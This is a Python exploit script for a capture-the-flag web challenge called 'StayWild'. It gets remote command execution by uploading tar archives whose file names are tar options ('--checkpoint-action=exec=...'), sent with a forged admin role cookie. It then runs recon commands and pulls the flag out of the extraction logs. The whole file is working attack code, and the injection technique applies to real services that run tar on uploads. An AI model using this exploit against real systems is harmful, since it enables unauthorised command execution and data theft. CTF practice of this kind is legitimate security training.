#!/usr/bin/env python3
"""StayWild final exploit — RCE via tar checkpoint injection, read flag."""
import requests, tarfile, io, re, base64

BASE = "https://staywild-b801c2592f1f.inst.omnictf.com"
s = requests.Session()
s.verify = False
requests.packages.urllib3.disable_warnings()

def make_tar(files_dict):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w') as tf:
        for name, content in files_dict.items():
            info = tarfile.TarInfo(name=name)
            data = content.encode() if isinstance(content, str) else content
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    buf.seek(0)
    return buf

def run_cmd(cmd):
    """Execute command via tar checkpoint injection. Returns full page text."""
    # Step 1: Normal initial tar
    r = s.post(BASE + "/staging", files={"file": ("archive.tar", make_tar({"d.txt": "x"}), "application/x-tar")}, allow_redirects=False)
    ws = r.headers.get("Location", "").split("/")[-1]
    if not ws:
        print("Failed to create workspace!")
        return ""

    # Step 2: Additional tar with checkpoint filenames
    s.post(
        BASE + f"/additional/{ws}",
        files={"file": ("extra.tar", make_tar({
            "t.txt": "x",
            "--checkpoint=1": "",
            f"--checkpoint-action=exec={cmd}": "",
        }), "application/x-tar")},
        cookies={"role": "admin"},
        allow_redirects=True
    )

    # Step 3: Second additional to trigger extraction with checkpoint args
    s.post(
        BASE + f"/additional/{ws}",
        files={"file": ("extra.tar", make_tar({"t2.txt": "x"}), "application/x-tar")},
        cookies={"role": "admin"},
        allow_redirects=True
    )

    # Read workspace
    r = s.get(BASE + f"/staging/{ws}", cookies={"role": "admin"})
    return r.text

def extract_output(page, extraction_num=3):
    """Extract command output from extraction logs."""
    m = re.search(r'id="allLogs"[^>]*>(.*?)</pre>', page, re.DOTALL)
    if not m:
        return ""
    logs = m.group(1)
    # Find extraction N output — command output appears right after the header
    pattern = rf'\[extraction {extraction_num}\] additional extraction pass\n(.*?)(?:\n(?:tar:|d\.txt|\[)|$)'
    m2 = re.search(pattern, logs, re.DOTALL)
    if m2:
        return m2.group(1).strip()
    return logs

# === Recon: ls -la to see workspace contents ===
print("=== ls -la ===")
page = run_cmd("ls -la")
output = extract_output(page)
print(output)

# Show full extraction 3 section
m = re.search(r'id="allLogs"[^>]*>(.*?)</pre>', page, re.DOTALL)
if m:
    for line in m.group(1).split('\n'):
        if 'extraction 3' in line or (line and not line.startswith('[') and 'tar:' not in line and 'Not found' not in line):
            pass
    # Just print the extraction 3 block
    parts = m.group(1).split('[extraction 3]')
    if len(parts) > 1:
        print("\n--- Extraction 3 raw ---")
        print('[extraction 3]' + parts[1].split('[additional')[0])

# === Try reading with nl .p* ===
print("\n\n=== nl .p* ===")
page = run_cmd("nl .p*")
m = re.search(r'id="allLogs"[^>]*>(.*?)</pre>', page, re.DOTALL)
if m:
    parts = m.group(1).split('[extraction 3]')
    if len(parts) > 1:
        ext3 = '[extraction 3]' + parts[1].split('[additional')[0]
        print(ext3)

if 'omniCTF' in page:
    flag = re.search(r'omniCTF\{[^}]+\}', page)
    if flag:
        print(f"\n*** FLAG: {flag.group()} ***")

# === Try with base64 in case output is encoded ===
print("\n\n=== nl .p* | base64 ===")
page = run_cmd("sh -c 'nl .p*|base64'")
m = re.search(r'id="allLogs"[^>]*>(.*?)</pre>', page, re.DOTALL)
if m:
    parts = m.group(1).split('[extraction 3]')
    if len(parts) > 1:
        ext3 = parts[1].split('[additional')[0]
        print(ext3)
        # Try base64 decode any long strings
        for line in ext3.split('\n'):
            line = line.strip()
            if len(line) > 10 and not line.startswith('[') and not line.startswith('tar:'):
                try:
                    decoded = base64.b64decode(line).decode('utf-8', errors='replace')
                    print(f"Decoded: {decoded}")
                    if 'omniCTF' in decoded:
                        print(f"\n*** FLAG: {decoded.strip()} ***")
                except:
                    pass

# === Try find / ls to locate the flag ===
print("\n\n=== find . -name '.p*' ===")
page = run_cmd("find . -name '.p*'")
m = re.search(r'id="allLogs"[^>]*>(.*?)</pre>', page, re.DOTALL)
if m:
    parts = m.group(1).split('[extraction 3]')
    if len(parts) > 1:
        print(parts[1].split('[additional')[0])

# === ls -la hidden files ===
print("\n\n=== ls -la .* ===")
page = run_cmd("ls -la .*")
m = re.search(r'id="allLogs"[^>]*>(.*?)</pre>', page, re.DOTALL)
if m:
    parts = m.group(1).split('[extraction 3]')
    if len(parts) > 1:
        print(parts[1].split('[additional')[0])

# === Try reading /opt/wild/.cache/seed-574 via nl ===
# But / is blocked. Try with env or readlink
print("\n\n=== env ===")
page = run_cmd("env")
m = re.search(r'id="allLogs"[^>]*>(.*?)</pre>', page, re.DOTALL)
if m:
    parts = m.group(1).split('[extraction 3]')
    if len(parts) > 1:
        print(parts[1].split('[additional')[0])

# === pwd ===
print("\n\n=== pwd ===")
page = run_cmd("pwd")
m = re.search(r'id="allLogs"[^>]*>(.*?)</pre>', page, re.DOTALL)
if m:
    parts = m.group(1).split('[extraction 3]')
    if len(parts) > 1:
        print(parts[1].split('[additional')[0])
